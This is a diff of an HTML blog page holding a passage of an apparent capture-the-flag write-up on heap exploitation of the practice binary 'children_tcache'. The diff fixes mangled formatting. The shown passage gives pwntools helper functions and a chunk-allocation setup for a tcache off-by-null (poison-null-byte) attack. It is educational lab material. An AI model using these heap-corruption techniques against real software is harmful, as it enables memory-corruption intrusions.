@@ -535,40 +535,51 @@
 </li>
 <li><p>It allows the active number of allocations upto 10(inclusice) times.</p>
 <h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>First and foremost, I created the wrapper functions such that we interact with binary more freely:-</p>
-<pre class=" language-py"><code class="language-py">from pwn import *
-</code></pre>
 </li>
 </ul>
-<p>def new_heap(size, data, attack=False):<br>    p.sendlineafter(‘Your choice: ‘, ‘1’)<br>    p.sendlineafter(‘Size:’, str(size))<br>    if attack:<br>        return<br>    p.sendafter(‘Data:’, data)<br>    if len(data) &lt; size:<br>        p.sendline()</p>
-<p>def show_heap(index):<br>    p.sendlineafter(‘Your choice: ‘, ‘2’)<br>    p.sendlineafter(‘Index:’, str(index))</p>
-<p>def delete_heap(index):<br>    p.sendlineafter(‘Your choice: ‘, ‘3’)<br>    p.sendlineafter(‘Index:’, str(index))</p>
-<pre><code>
-This being aide, now let&#39;s jump into the heap exploitation part, to start off, we will create following number of chunks:-
+<pre class=" language-py"><code class="language-py">from pwn import *
 
-* `0x500` size chunk.
-* `0x68` size chunk.
-* `0x5f0` size chunk.
-* `0x18` size chunk.
+def new_heap(size, data, attack=False):
+    p.sendlineafter('Your choice: ', '1')
+    p.sendlineafter('Size:', str(size))
+    if attack:
+        return
+    p.sendafter('Data:', data)
+    if len(data) < size:
+        p.sendline()
 
-This is because, we will need the 2 chunk of siz such taht when `tcache` bins would be full they&#39;ll land into the `unsorted` bin. Moving on, we will fill the `tcache` bins for the `size` of the chunks we allocated:-
+def show_heap(index):
+    p.sendlineafter('Your choice: ', '2')
+    p.sendlineafter('Index:', str(index))
 
-```py
-p = process(&quot;./children_tcache&quot;)
+def delete_heap(index):
+    p.sendlineafter('Your choice: ', '3')
+    p.sendlineafter('Index:', str(index))</code></pre>
+<p>This being aide, now let’s jump into the heap exploitation part, to start off, we will create following number of chunks:-</p>
+<ul>
+<li><code>0x500</code> size chunk.</li>
+<li><code>0x68</code> size chunk.</li>
+<li><code>0x5f0</code> size chunk.</li>
+<li><code>0x18</code> size chunk.</li>
+</ul>
+<p>This is because, we will need the 2 chunk of size such that when <code>tcache</code> bins would be full they’ll land into the <code>unsorted</code> bin. Moving on, we will fill the <code>tcache</code> bins for the <code>size</code> of the chunks we allocated:-</p>
+<pre class=" language-py"><code class="language-py">p = process("./children_tcache")
 
-# heap_list[0] =&gt; chunk_0 (0x511)
-new_heap(0x500, &#39;a&#39; * 0x4ff)
+# heap_list[0] => chunk_0 (0x511)
+new_heap(0x500, 'a' * 0x4ff)
 
-# heap_list[1] =&gt; chunk_1 (0x71)
-new_heap(0x68, &#39;b&#39; * 0x67)
+# heap_list[1] => chunk_1 (0x71)
+new_heap(0x68, 'b' * 0x67)
 
-# heap_list[2] =&gt; chunk_2 (0x601)
+# heap_list[2] => chunk_2 (0x601)
 
-new_heap(0x5f0, &#39;c&#39; * 0x5ef)
+new_heap(0x5f0, 'c' * 0x5ef)
 
-# heap_list[3] =&gt; chunk_3 (0x31)
+# heap_list[3] => chunk_3 (0x31)
 # This chunk is for preventing consolidation of previous chunk with the top chunk
 
-new_heap(0x20, &#39;d&#39; * 0x20)</code></pre><p>Now, this will do the allocation, as nothing important to see as much, to explain the size allocation here, we will be <code>unsorted</code> bin size for doing the overlapping chunk here, to move on, we will delete the <code>chunk_1</code> and <code>chunk_0</code>, the <code>chunk_1</code> belongs to the <code>unsorted</code> bin since it’s size is morte than the <code>tcache</code> can hold and the <code>chunk_0</code> will go in the <code>tcache</code>.</p>
+new_heap(0x20, 'd' * 0x20)</code></pre>
+<p>Now, this will do the allocation, as nothing important to see as much, to explain the size allocation here, we will be <code>unsorted</code> bin size for doing the overlapping chunk here, to move on, we will delete the <code>chunk_1</code> and <code>chunk_0</code>, the <code>chunk_1</code> belongs to the <code>unsorted</code> bin since it’s size is morte than the <code>tcache</code> can hold and the <code>chunk_0</code> will go in the <code>tcache</code>.</p>
 <pre class=" language-py"><code class="language-py"># we need to delete chunk_1, this is because we will be using this chunk to
 #  to trigger the off-by-null (poison-null-byte) attack
 
